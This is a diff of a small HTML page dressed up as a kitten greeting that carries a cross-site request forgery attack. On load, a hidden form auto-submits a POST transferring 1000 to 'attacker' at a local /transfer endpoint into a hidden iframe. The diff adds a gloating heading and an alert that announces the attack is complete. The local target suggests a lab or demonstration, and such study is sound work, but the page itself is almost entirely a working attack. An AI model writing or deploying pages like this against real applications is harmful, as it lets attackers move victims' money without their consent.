@@ -1,17 +1,23 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Hello kitty!</h1>
+<h1>Hello kitty! Your account balance has been stolen :)</h1>
 <img src="https://i.etsystatic.com/43513556/r/il/f5a9b2/5829958772/il_570xN.5829958772_2ggq.jpg" alt="Cute kitten">
 
-<iframe style="display: none;" name="csrf-iframe"></iframe>
+<iframe id="csrf-iframe" name="csrf-iframe" style="display: none;"></iframe>
 
 <form action="http://127.0.0.1:5000/transfer" method="POST" id="csrf-form" target="csrf-iframe">
     <input type="hidden" name="to" value="attacker">
     <input type="hidden" name="amount" value="1000">
 </form>
 
-<script>document.getElementById("csrf-form").submit()</script>
+<script>
+document.getElementById("csrf-form").submit();
+
+document.getElementById("csrf-iframe").onload = function() {
+    alert("CSRF attack attempt completed. Please check the target account balance to verify if the attack was successful.");
+};
+</script>
 
 </body>
 </html>
